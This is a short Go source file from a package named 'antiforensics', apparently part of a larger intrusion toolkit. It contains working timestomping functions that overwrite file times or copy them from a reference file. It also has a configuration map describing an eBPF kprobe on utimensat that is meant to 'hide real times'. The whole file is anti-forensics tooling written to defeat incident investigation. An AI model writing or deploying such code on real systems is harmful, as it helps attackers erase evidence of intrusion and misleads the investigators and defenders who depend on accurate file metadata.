package antiforensics

import (
	"fmt"
	"os"
	"time"
)

type TimestampConfig struct {
	Paths      []string
	TargetTime time.Time
	MatchDir   bool
}

func (c *Controller) WipeTimestamps(paths []string, target time.Time) (int, error) {
	modified := 0
	for _, path := range paths {
		if err := os.Chtimes(path, target, target); err != nil {
			continue
		}
		modified++
	}
	return modified, nil
}

func (c *Controller) CopyTimestamp(src, dst string) error {
	info, err := os.Stat(src)
	if err != nil {
		return fmt.Errorf("stat source: %w", err)
	}
	return os.Chtimes(dst, info.ModTime(), info.ModTime())
}

func (c *Controller) TimestompBPFConfig() map[string]any {
	return map[string]any{
		"hook_point": "kprobe/utimensat",
		"description": "intercept timestamp modification to hide real times",
		"strategy":    "replace target time with reference file time",
	}
}
